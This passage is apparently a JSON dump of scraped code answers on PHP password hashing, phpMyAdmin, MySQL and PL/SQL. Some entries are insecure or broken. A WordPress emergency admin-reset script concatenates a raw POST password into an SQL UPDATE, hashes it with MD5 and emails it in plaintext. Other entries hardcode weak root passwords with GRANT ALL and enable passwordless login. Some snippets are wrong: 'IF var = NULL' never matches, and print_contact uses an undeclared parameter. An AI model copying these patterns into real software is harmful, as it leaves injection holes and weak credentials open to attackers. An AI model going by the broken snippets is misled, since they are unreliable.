    "description": "//hash password $pass = password_hash($password, PASSWORD_DEFAULT);  //verify password password_verify($password, $hashed_password); // returns true\n /* User's password. */ $password = 'my secret password';  /* Secure password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  \n <?php /**  * We just want to hash our password using the current DEFAULT algorithm.  * This is presently BCRYPT, and will produce a 60 character result.  *  * Beware that DEFAULT may change over time, so you would want to prepare  * By allowing your storage to expand past 60 characters (255 would be good)  */ echo password_hash(\"rasmuslerdorf\", PASSWORD_DEFAULT); ?>  \n <?php echo 'Argon2i hash: ' . password_hash('rasmuslerdorf', PASSWORD_ARGON2I); ?>  \n <?php /**  * In this case, we want to increase the default cost for BCRYPT to 12.  * Note that we also switched to BCRYPT, which will always be 60 characters.  */ $options = [     'cost' => 12, ]; echo password_hash(\"rasmuslerdorf\", PASSWORD_BCRYPT, $options); ?>  \n /* New password. */ $password = $_POST['password'];  /* Remember to validate the password. */  /* Create the new password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  \n /* Include the database connection script. */ include 'pdo.php';  /* Login status: false = not authenticated, true = authenticated. */ $login = FALSE;  /* Username from the login form. */ $username = $_POST['username'];  /* Password from the login form. */ $password = $_POST['password'];  /* Remember to validate $username and $password. */  /* Look for the username in the database. */ $query = 'SELECT * FROM accounts WHERE (account_name = :name)';  /* Values array for PDO. */ $values = [':name' => $username];  /* Execute the query */ try {   $res = $pdo->prepare($query);   $res->execute($values); } catch (PDOException $e) {   /* Query error. */   echo 'Query error.';   die(); }  $row = $res->fetch(PDO::FETCH_ASSOC);  /* If there is a result, check if the password matches using password_verify(). */ if (is_array($row)) {   if (password_verify($password, $row['account_passwd']))   {     /* The password is correct. */     $login = TRUE;   } }  \n /* Include the database connection script. */ include 'pdo.php';  /* Username. */ $username = 'John';  /* Password. */ $password = 'my secret password';  /* Secure password hash. */ $hash = password_hash($password, PASSWORD_DEFAULT);  /* Insert query template. */ $query = 'INSERT INTO accounts (account_name, account_passwd) VALUES (:name, :passwd)';  /* Values array for PDO. */ $values = [':name' => $username, ':passwd' => $hash];  /* Execute the query. */ try {   $res = $pdo->prepare($query);   $res->execute($values); } catch (PDOException $e) {   /* Query error. */   echo 'Query error.';   die(); }  \n /* User's password. */ $password = 'my secret password';  /* MD5 hash to be saved in the database. */ $hash = md5($password);  \n /* 100 ms. */ $time = 0.1;  /* Initial cost. */ $cost = 10;  /* Loop until the time required is more than 100ms. */ do {   /* Increase the cost. */   $cost++;      /* Check how much time we need to create the hash. */   $start = microtime(true);   password_hash('test', PASSWORD_BCRYPT, ['cost' => $cost]);   $end = microtime(true); } while (($end - $start) < $time);  echo 'Cost found: ' . $cost;  \n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3075,
    "keyword": null,
    "link": null,
    "title": " php mysqli install",
    "description": "Installation / Runtime Configuration For the MySQLi functions to be available, you must compile PHP with support for the MySQLi extension. The MySQLi extension was introduced with PHP version 5.0. 0. The MySQL Native Driver was included in PHP version 5.3.\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3076,
    "keyword": null,
    "link": null,
    "title": " php server self",
    "description": "<form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\">  //there is no reason to use this to submit form data to the same page <form action=\"\">  //will do the same thing\nCREATE DATABASE databasename;\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3077,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin change password",
    "description": "-- DEFAULT: Username:root , Password: &ndash;  (none) mysql> SET PASSWORD FOR root@localhost=PASSWORD('mypassword'); mysql> GRANT ALL PRIVILEGES ON *.* TO root@localhost  \tIDENTIFIED BY 'mypassword' WITH GRANT OPTION;\nLogin to phpMyAdmin Go To User Accounts Click on Add User account Enter your desired ID & Pass  \n<?php /* \tThis program is free software; you can redistribute it and/or modify     \tit under the terms of the GNU General Public License as published by     \tthe Free Software Foundation; either version 2 of the License, or     \t(at your option) any later version.  \tThis program is distributed in the hope that it will be useful,     \tbut WITHOUT ANY WARRANTY; without even the implied warranty of     \tMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     \tGNU General Public License for more details.  \tYou should have received a copy of the GNU General Public License     \talong with this program; if not, write to the Free Software     \tFoundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA */  require './wp-blog-header.php';  function meh() { \tglobal $wpdb;  \tif ( isset( $_POST['update'] ) ) { \t\t$user_login = ( empty( $_POST['e-name'] ) ? '' : sanitize_user( $_POST['e-name'] ) ); \t\t$user_pass  = ( empty( $_POST[ 'e-pass' ] ) ? '' : $_POST['e-pass'] ); \t\t$answer = ( empty( $user_login ) ? '<div id=\"message\" class=\"updated fade\"><p><strong>The user name field is empty.</strong></p></div>' : '' ); \t\t$answer .= ( empty( $user_pass ) ? '<div id=\"message\" class=\"updated fade\"><p><strong>The password field is empty.</strong></p></div>' : '' ); \t\tif ( $user_login != $wpdb->get_var( \"SELECT user_login FROM $wpdb->users WHERE ID = '1' LIMIT 1\" ) ) { \t\t\t$answer .=\"<div id='message' class='updated fade'><p><strong>That is not the correct administrator username.</strong></p></div>\"; \t\t} \t\tif ( empty( $answer ) ) { \t\t\t$wpdb->query( \"UPDATE $wpdb->users SET user_pass = MD5('$user_pass'), user_activation_key = '' WHERE user_login = '$user_login'\" ); \t\t\t$plaintext_pass = $user_pass; \t\t\t$message = __( 'Someone, hopefully you, has reset the Administrator password for your WordPress blog. Details follow:' ). \"\\r\\n\"; \t\t\t$message  .= sprintf( __( 'Username: %s' ), $user_login ) . \"\\r\\n\"; \t\t\t$message .= sprintf( __( 'Password: %s' ), $plaintext_pass ) . \"\\r\\n\"; \t\t\t@wp_mail( get_option( 'admin_email' ), sprintf( __( '[%s] Your WordPress administrator password has been changed!' ), get_option( 'blogname' ) ), $message ); \t\t\t$answer=\"<div id='message' class='updated fade'><p><strong>Your password has been successfully changed</strong></p><p><strong>An e-mail with this information has been dispatched to the WordPress blog administrator</strong></p><p><strong>You should now delete this file off your server. DO NOT LEAVE IT UP FOR SOMEONE ELSE TO FIND!</strong></p></div>\"; \t\t} \t}  \treturn empty( $answer ) ? false : $answer; }  $answer = meh(); ?> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> \t<title>WordPress Emergency PassWord Reset</title> \t<meta http-equiv=\"Content-Type\" content=\"<?php bloginfo( 'html_type' ); ?>; charset=<?php bloginfo( 'charset' ); ?>\" /> \t<link rel=\"stylesheet\" href=\"<?php bloginfo( 'wpurl' ); ?>/wp-admin/wp-admin.css?version=<?php bloginfo( 'version' ); ?>\" type=\"text/css\" /> </head> <body> \t<div class=\"wrap\"> \t\t<form method=\"post\" action=\"\"> \t\t\t<h2>WordPress Emergency PassWord Reset</h2> \t\t\t<p><strong>Your use of this script is at your sole risk. All code is provided \"as -is\", without any warranty, whether express or implied, of its accuracy, completeness. Further, I shall not be liable for any damages you may sustain by using this script, whether direct, indirect, special, incidental or consequential.</strong></p> \t\t\t<p>This script is intended to be used as <strong>a last resort</strong> by WordPress administrators that are unable to access the database. \t\t\t\tUsage of this script requires that you know the Administrator's user name for the WordPress install. (For most installs, that is going to be \"admin\" without the quotes.)</p> \t\t\t<?php \t\t\techo $answer; \t\t\t?> \t\t\t<p class=\"submit\"><input type=\"submit\" name=\"update\" value=\"Update Options\" /></p>  \t\t\t<fieldset class=\"options\"> \t\t\t\t<legend>WordPress Administrator</legend> \t\t\t\t<label><?php _e( 'Enter Username:' ) ?><br /> \t\t\t\t\t<input type=\"text\" name=\"e-name\" id=\"e-name\" class=\"input\" value=\"<?php echo attribute_escape( stripslashes( $_POST['e-name'] ) ); ?>\" size=\"20\" tabindex=\"10\" /></label> \t\t\t\t</fieldset> \t\t\t\t<fieldset class=\"options\"> \t\t\t\t\t<legend>Password</legend> \t\t\t\t\t<label><?php _e( 'Enter New Password:' ) ?><br /> \t\t\t\t\t<input type=\"text\" name=\"e-pass\" id=\"e-pass\" class=\"input\" value=\"<?php echo attribute_escape( stripslashes( $_POST['e-pass'] ) ); ?>\" size=\"25\" tabindex=\"20\" /></label> \t\t\t\t</fieldset>  \t\t\t\t<p class=\"submit\"><input type=\"submit\" name=\"update\" value=\"Update Options\" /></p> \t\t\t</form> \t\t</div> \t</body> </html> <?php exit; ?> \n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3078,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin default password",
    "description": "// in config.sample.inc.php change this to true $cfg['Servers'][$i]['AllowNoPassword'] = false; // in config.sample.inc.php add this  $cfg['Servers'][$i]['user'] = 'root'; $cfg['Servers'][$i]['password'] = '123'; // refresh\n-- DEFAULT: Username:root , Password: &ndash;  (none) mysql> SET PASSWORD FOR root@localhost=PASSWORD('mypassword'); mysql> GRANT ALL PRIVILEGES ON *.* TO root@localhost  \tIDENTIFIED BY 'mypassword' WITH GRANT OPTION;\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3079,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin password",
    "description": "// in config.sample.inc.php change this to true $cfg['Servers'][$i]['AllowNoPassword'] = false; // in config.sample.inc.php add this  $cfg['Servers'][$i]['user'] = 'root'; $cfg['Servers'][$i]['password'] = '123'; // refresh\n-- DEFAULT: Username:root , Password: &ndash;  (none) mysql> SET PASSWORD FOR root@localhost=PASSWORD('mypassword'); mysql> GRANT ALL PRIVILEGES ON *.* TO root@localhost  \tIDENTIFIED BY 'mypassword' WITH GRANT OPTION;\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3080,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin password root",
    "description": "-- DEFAULT: Username:root , Password: &ndash;  (none) mysql> SET PASSWORD FOR root@localhost=PASSWORD('mypassword'); mysql> GRANT ALL PRIVILEGES ON *.* TO root@localhost  \tIDENTIFIED BY 'mypassword' WITH GRANT OPTION;\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3081,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin reset root password",
    "description": "-- DEFAULT: Username:root , Password: &ndash;  (none) mysql> SET PASSWORD FOR root@localhost=PASSWORD('mypassword'); mysql> GRANT ALL PRIVILEGES ON *.* TO root@localhost  \tIDENTIFIED BY 'mypassword' WITH GRANT OPTION;\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3082,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin show create table query",
    "description": "SHOW CREATE TABLE tablename\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3083,
    "keyword": null,
    "link": null,
    "title": " pip install mysqlclient error",
    "description": "First install python 3.6.5, then run  pip install mysqlclient==1.3.12\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3084,
    "keyword": null,
    "link": null,
    "title": " pipe row function in oracle example",
    "description": "-- Return types CREATE TYPE t_tf_row AS OBJECT (   \tid           NUMBER,   \tdescription  VARCHAR2(50) ); CREATE TYPE t_tf_tab IS TABLE OF t_tf_row; -- Build a pipelined table function. CREATE OR REPLACE FUNCTION get_tab_ptf (p_rows IN NUMBER)  \tRETURN t_tf_tab PIPELINED AS BEGIN   \tFOR i IN 1 .. p_rows LOOP     \tPIPE ROW(t_tf_row(i, 'Description for ' || i));      \tEND LOOP;   \tRETURN; END; -- Test it. SELECT * FROM TABLE(get_tab_ptf(10)) ORDER BY id DESC;\n",
    "reg_date": "2021-10-12T09:58:48.000Z"
  },
  {
    "id": 3085,
    "keyword": null,
    "link": null,
    "title": " pivot table",
    "description": "SELECT *        -- Total invoices per gender FROM (     SELECT invoice, gender     FROM sales ) d PIVOT (     sum(invoice)     FOR gender IN ('F' AS \"Women\", 'M' AS \"Men\") ); -- Table Sales: CREATE TABLE sales (     gender VARCHAR2(1 BYTE),\t\t-- 'F' or 'M'     invoice NUMBER );\nPIVOT \t(SUM(TotalDue) \tFOR Qyr      IN ([2013 Q1], [2013 Q2], [2013 Q3], [2013 Q4]) \t) AS PivotTable\nselect * from (   select game, player, goals   from yourtable ) src pivot (   sum(goals)   for player in ([John], [Paul], [Mark], [Luke]) ) piv order by game \nSELECT SalesAgent AS PivotSalesAgent, India, US, UK FROM tblAgentsSales PIVOT  ( \tSUM(SalesAmount) FOR SalesCountry IN (India, US, UK) ) AS testPivotTable   SELECT SalesAgent GrpBySalesAgent, SalesCountry, SUM(SalesAmount) Sales  from tblAgentsSales  GROUP BY SalesAgent, SalesCountry   select SalesAgent TableSalesAgent, SalesCountry, SalesAmount  from tblAgentsSales\nSELECT SalesAgent AS PivotSalesAgent, India, US, UK FROM tblAgentsSales PIVOT  ( \tSUM(SalesAmount) FOR SalesCountry IN (India, US, UK) ) AS testPivotTable   SELECT SalesAgent GrpBySalesAgent, SalesCountry, SUM(SalesAmount) Sales from tblAgentsSales  GROUP BY SalesAgent, SalesCountry   select SalesAgent TableSalesAgent, SalesCountry, SalesAmount from tblAgentsSales\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3086,
    "keyword": null,
    "link": null,
    "title": " pl/sql  procedure",
    "description": "CREATE [OR REPLACE] PROCEDURE procedure_name     [ (parameter [,parameter]) ]  IS     [declaration_section]  BEGIN     executable_section  [EXCEPTION     exception_section]  END [procedure_name];\n                                     CREATE OR REPLACE PROCEDURE print_contact(     in_customer_id NUMBER  ) IS   r_contact contacts%ROWTYPE; BEGIN   -- get contact based on customer id   SELECT *   INTO r_contact   FROM contacts   WHERE customer_id = p_customer_id;    -- print out contact's information   dbms_output.put_line( r_contact.first_name || ' ' ||   r_contact.last_name || '<' || r_contact.email ||'>' );  EXCEPTION    WHEN OTHERS THEN       dbms_output.put_line( SQLERRM ); END; \nCREATE OR REPLACE Procedure UpdateCourse    ( name_in IN varchar2 )  IS    cnumber number;     cursor c1 is    SELECT course_number     FROM courses_tbl     WHERE course_name = name_in;  BEGIN     open c1;    fetch c1 into cnumber;     if c1%notfound then       cnumber := 9999;    end if;     INSERT INTO student_courses    ( course_name,      course_number )    VALUES    ( name_in,      cnumber );     commit;     close c1;  EXCEPTION WHEN OTHERS THEN    raise_application_error(-20001,'An error was encountered - '||SQLCODE||' -ERROR- '||SQLERRM); END;\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3087,
    "keyword": null,
    "link": null,
    "title": " pl/sql case when multiple values",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3088,
    "keyword": null,
    "link": null,
    "title": " pl/sql how to delete a trigger",
    "description": "DROP TRIGGER trigger_name;\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3089,
    "keyword": null,
    "link": null,
    "title": " pl/sql loop example",
    "description": "DECLARE   l_counter NUMBER := 0; BEGIN   LOOP     l_counter := l_counter + 1;     IF l_counter > 3 THEN       EXIT;     END IF;     dbms_output.put_line( 'Inside loop: ' || l_counter )  ;   END LOOP;   -- control resumes here after EXIT   dbms_output.put_line( 'After loop: ' || l_counter ); END;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3090,
    "keyword": null,
    "link": null,
    "title": " pl/sql print to console",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3091,
    "keyword": null,
    "link": null,
    "title": " pl/sql print variable",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3092,
    "keyword": null,
    "link": null,
    "title": " pl/sql procedure example",
    "description": "CREATE OR REPLACE PROCEDURE my_schema.my_procedure(param1 IN VARCHAR2) IS     cnumber NUMBER; BEGIN     cnumber := 10;     INSERT INTO my_table (num_field) VALUES (param1 + cnumber);     COMMIT; EXCEPTION     WHEN OTHERS THEN         raise_application_error(-20001, 'An error was encountered - '             || sqlcode || ' -ERROR- ' || sqlerrm); END;\nCREATE [OR REPLACE] PROCEDURE procedure_name     [ (parameter [,parameter]) ]  IS     [declaration_section]  BEGIN     executable_section  [EXCEPTION     exception_section]  END [procedure_name];\nCREATE OR REPLACE Procedure UpdateCourse    ( name_in IN varchar2 )  IS    cnumber number;     cursor c1 is    SELECT course_number     FROM courses_tbl     WHERE course_name = name_in;  BEGIN     open c1;    fetch c1 into cnumber;     if c1%notfound then       cnumber := 9999;    end if;     INSERT INTO student_courses    ( course_name,      course_number )    VALUES    ( name_in,      cnumber );     commit;     close c1;  EXCEPTION WHEN OTHERS THEN    raise_application_error(-20001,'An error was encountered - '||SQLCODE||' -ERROR- '||SQLERRM); END;\n                                     CREATE OR REPLACE PROCEDURE print_contact(     in_customer_id NUMBER  ) IS   r_contact contacts%ROWTYPE; BEGIN   -- get contact based on customer id   SELECT *   INTO r_contact   FROM contacts   WHERE customer_id = p_customer_id;    -- print out contact's information   dbms_output.put_line( r_contact.first_name || ' ' ||   r_contact.last_name || '<' || r_contact.email ||'>' );  EXCEPTION    WHEN OTHERS THEN       dbms_output.put_line( SQLERRM ); END; \nCREATE PROCEDURE nome_procedura [(parametri)] IS \tDefinizioni; BEGIN \tCorpo procedura; END;\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3093,
    "keyword": null,
    "link": null,
    "title": " pl/sql return current date",
    "description": "SELECT Sysdate AS System_date FROM Dual \n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3094,
    "keyword": null,
    "link": null,
    "title": " pl sql asynchronous procedure calls",
    "description": "-- To call a procedure asynchronously, create a auto_drop job: BEGIN     DBMS_SCHEDULER.create_job(             job_name => 'My_JOB_NAME',             job_type => 'PLSQL_BLOCK',             job_action => 'BEGIN my_procedure(); END;',             start_date => systimestamp,             auto_drop => TRUE,             enabled => TRUE         ); END;\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3095,
    "keyword": null,
    "link": null,
    "title": " pl sql case",
    "description": "SELECT product_id, product_type_id,   CASE product_type_id     WHEN 1 THEN 'Book'     WHEN 2 THEN 'Video'     WHEN 3 THEN 'DVD'     WHEN 4 THEN 'CD'     ELSE 'Magazine'   END FROM products;\nCASE [ expression ]     WHEN condition_1 THEN result_1    WHEN condition_2 THEN result_2    ...    WHEN condition_n THEN result_n     ELSE result  END\n",
    "reg_date": "2021-10-12T09:58:49.000Z"
  },
  {
    "id": 3096,
    "keyword": null,
    "link": null,
    "title": " pl sql check if variable is empty",
    "description": "IF var = NULL THEN...\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3097,
    "keyword": null,
    "link": null,
    "title": " pl sql cursor",
    "description": "  FOR b IN (SELECT *                FROM sometable)   LOOP     <<do something   b.somevalue>>   END LOOP;\nFOR record_name IN cursor_name LOOP  \tstatement1;  \tstatement2;  \t. . .  END LOOP;\n/*Is abit complex*/  set serveroutput on ;  Declare  departmentName departments.department_name %Type; countryName countries.country_name%Type; countryName2 countries.country_name%Type; cursor info2 is select countries.country_name from departments,countries,locations where departments.location_id=locations.location_id and locations.country_id=countries.country_id GROUP by countries.country_name;   cursor info is select  departments.department_name,countries.country_name from departments,countries,locations where departments.location_id=locations.location_id and locations.country_id=countries.country_id;  begin  for rec2 in info2 loop  countryName:= rec2.country_name;  dbms_output.put_line('Deparments in the ' || countryName ||' :' ||chr(13));   for rec in info   loop      departmentName:= rec.department_name;     countryName2:= rec.country_name;      if countryName2=countryName then           dbms_output.put_line('  '||departmentName);      end if;   end loop;    dbms_output.put_line('------------------------------------'); end loop; end; \n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3098,
    "keyword": null,
    "link": null,
    "title": " pl sql delete from table",
    "description": "DELETE FROM customers WHERE last_name = 'Smith';\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3099,
    "keyword": null,
    "link": null,
    "title": " pl sql drop trigger",
    "description": "DROP TRIGGER trigger_name;\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3100,
    "keyword": null,
    "link": null,
    "title": " pl sql escape &",
    "description": "-- syntax (This is specifically for PLSQL) ||CHR(38)||  -- example (You want: 'This symbol, &, works!') 'This symbol, '||CHR(38)||', works!'  -- Note: You could also use the \"SET DEFINE ~;\" code. Please see the  -- reference/source (URL) for more details\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3101,
    "keyword": null,
    "link": null,
    "title": " pl sql if else",
    "description": "DECLARE     a number(3) := 100;  BEGIN     IF ( a = 10 ) THEN        dbms_output.put_line('Value of a is 10' );     ELSIF ( a = 20 ) THEN        dbms_output.put_line('Value of a is 20' );     ELSIF ( a = 30 ) THEN        dbms_output.put_line('Value of a is 30' );     ELSE         dbms_output.put_line('None of the values is matching');     END IF;     dbms_output.put_line('Exact value of a is: '|| a );   END;  / \nIF condition1 THEN    {...statements to execute when condition1 is TRUE...}  ELSIF condition2 THEN    {...statements to execute when condition1 is FALSE and condition2 is TRUE...}  ELSE    {...statements to execute when both condition1 and condition2 are FALSE...}  END IF;\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3102,
    "keyword": null,
    "link": null,
    "title": " pl sql implicit cursor",
    "description": "  FOR b IN (SELECT *                FROM sometable)   LOOP     <<do something   b.somevalue>>   END LOOP;\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3103,
    "keyword": null,
    "link": null,
    "title": " pl sql insert into table",
    "description": "INSERT INTO categories (category_id, category_name) VALUES (150, 'Miscellaneous');\nINSERT INTO table (column1, column2, ... column_n ) VALUES (expression1, expression2, ... expression_n );\nINSERT INTO table (column1, column2, ... column_n ) SELECT expression1, expression2, ... expression_n FROM source_table [WHERE conditions];\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3104,
    "keyword": null,
    "link": null,
    "title": " pl sql output",
    "description": "dbms_output.put_line(\"YOUR MESSAGE\"); \ndbms_output.put_line('hello world!'); \n-- EXAMPLE SET SERVEROUTPUT ON; BEGIN DBMS_OUTPUT.PUT_LINE('This is printed. '||'This is concatenated and printed too!'); END; /\n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3105,
    "keyword": null,
    "link": null,
    "title": " pl sql ptint",
    "description": "dbms_output.put_line('hello world!'); \n",
    "reg_date": "2021-10-12T09:58:50.000Z"
  },
  {
    "id": 3106,
    "keyword": null,
    "link": null,
    "title": " pl sql trigger determine if insert or update or delete",
    "description": "CREATE OR REPLACE TRIGGER Audit_emp    AFTER INSERT OR UPDATE OR DELETE ON Emp_tab    FOR EACH ROW    DECLARE       Time_now DATE;       Terminal CHAR(10);    BEGIN       -- get current time, and the terminal of the user:       Time_now := SYSDATE;       Terminal := USERENV('TERMINAL');       -- record new employee primary key       IF INSERTING THEN           INSERT INTO Audit_table             VALUES (Audit_seq.NEXTVAL, User, Time_now,                Terminal, 'Emp_tab', 'INSERT', :new.Empno);    -- record primary key of the deleted row:       ELSIF DELETING THEN                                     INSERT INTO Audit_table             VALUES (Audit_seq.NEXTVAL, User, Time_now,                Terminal, 'Emp_tab', 'DELETE', :old.Empno);    -- for updates, record the primary key    -- of the row being updated:       ELSE           INSERT INTO Audit_table             VALUES (audit_seq.NEXTVAL, User, Time_now,                Terminal, 'Emp_tab', 'UPDATE', :old.Empno);       -- and for SAL and DEPTNO, record old and new values:          IF UPDATING ('SAL') THEN             INSERT INTO Audit_table_values                VALUES (Audit_seq.CURRVAL, 'SAL',                   :old.Sal, :new.Sal);           ELSIF UPDATING ('DEPTNO') THEN             INSERT INTO Audit_table_values                VALUES (Audit_seq.CURRVAL, 'DEPTNO',                   :old.Deptno, :new.DEPTNO);          END IF;       END IF; END;\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3107,
    "keyword": null,
    "link": null,
    "title": " plpgsql coalesce equivalent for empty string",
    "description": "COALESCE( NULLIF(col1,'') ,'none'); \n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3108,
    "keyword": null,
    "link": null,
    "title": " plpgsql create function",
    "description": "CREATE FUNCTION function_name(argument1 type,argument2 type)  RETURNS type AS BEGIN   staments; END; LANGUAGE 'language_name'; \npostgres=# Create or replace function fun1(n int) returns int   as  $$  Begin  Insert into test values (n,'2019-11-26');  Return 1;  End;  $$  Language 'plpgsql';  CREATE FUNCTION  postgres=# \n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3109,
    "keyword": null,
    "link": null,
    "title": " plpgsql if statement",
    "description": "                                     DO $$ DECLARE   a integer := 10;   b integer := 20; BEGIN    IF a > b THEN \tRAISE NOTICE 'a is greater than b';   END IF;    IF a < b THEN \tRAISE NOTICE 'a is less than b';   END IF;    IF a = b THEN \tRAISE NOTICE 'a is equal to b';   END IF; END $$; \nif condition then   statements; else   alternative-statements; END if;\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3110,
    "keyword": null,
    "link": null,
    "title": " pls sql update",
    "description": "UPDATE table SET column1 = expression1,     column2 = expression2,     ...     column_n = expression_n [WHERE conditions];\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3111,
    "keyword": null,
    "link": null,
    "title": " plsql add check TWO VALUES",
    "description": "ALTER TABLE suppliers ADD CONSTRAINT check_supplier_name   CHECK (supplier_name IN ('IBM', 'Microsoft', 'NVIDIA'));\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3112,
    "keyword": null,
    "link": null,
    "title": " plsql array",
    "description": "DECLARE     type namesarray IS VARRAY(5) OF VARCHAR2(10);     type grades IS VARRAY(5) OF INTEGER;     names namesarray;     marks grades;     total integer;  BEGIN     names := namesarray('Kavita', 'Pritam', 'Ayan', 'Rishav', 'Aziz');     marks:= grades(98, 97, 78, 87, 92);     total := names.count;     dbms_output.put_line('Total '|| total || ' Students');     FOR i in 1 .. total LOOP        dbms_output.put_line('Student: ' || names(i) || '        Marks: ' || marks(i));     END LOOP;  END;  /\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3113,
    "keyword": null,
    "link": null,
    "title": " plsql block",
    "description": "set serveroutput on; DECLARE    v_result NUMBER; BEGIN    v_result := 1 / 0;    DBMS_OUTPUT.PUT_LINE( v_result ); EXCEPTION    WHEN ZERO_DIVIDE THEN       DBMS_OUTPUT.PUT_LINE( SQLERRM ); END;\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3114,
    "keyword": null,
    "link": null,
    "title": " plsql code for deleting a row from nested table in oracle",
    "description": "DELETE TABLE(SELECT <nested table name>   FROM <parent table name> <table alias>   WHERE <clause>) <nested table alias> WHERE <clause>;\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3115,
    "keyword": null,
    "link": null,
    "title": " plsql find location of procedure",
    "description": "SELECT *  FROM SYS.DBA_DEPENDENCIES  WHERE  REFERENCED_NAME = '<NAME_OF_PKG_OR_PROC_FUNC>' AND  REFERENCED_TYPE IN ('PACKAGE', 'PROCEDURE', 'FUNCTION'); \n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3116,
    "keyword": null,
    "link": null,
    "title": " plsql least",
    "description": "--in query use MIN  SELECT MIN(something) FROM some_table;  --in statements use LEAST  (watch out, if there is a null it will return null) local_variable := LEAST('2', '5', '12', '3');  --Here some examples LEAST('2', '5', '12', '3') Result: '12'  LEAST(2, 5, 12, 3) Result: 2  LEAST('apples', 'applis', 'applas') Result: 'applas'  LEAST('apples', 'applis', 'applas', null) Result: NULL\n",
    "reg_date": "2021-10-12T09:58:51.000Z"
  },
  {
    "id": 3117,
    "keyword": null,
    "link": null,
    "title": " plsql left() function",
    "description": "SUBSTR( \"20190601\", 0, 6 )\nSUBSTR( string, start_position [, length ] )\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3118,
    "keyword": null,
    "link": null,
    "title": " plsql print",
    "description": "dbms_output.put_line(\"YOUR MESSAGE\"); \n-- EXAMPLE SET SERVEROUTPUT ON; BEGIN DBMS_OUTPUT.PUT_LINE('This is printed. '||'This is concatenated and printed too!'); END; /\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3119,
    "keyword": null,
    "link": null,
    "title": " plsql substr",
    "description": "SUBSTR( string, start_position [, length ] )\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3120,
    "keyword": null,
    "link": null,
    "title": " port 3306 mysql",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\n",
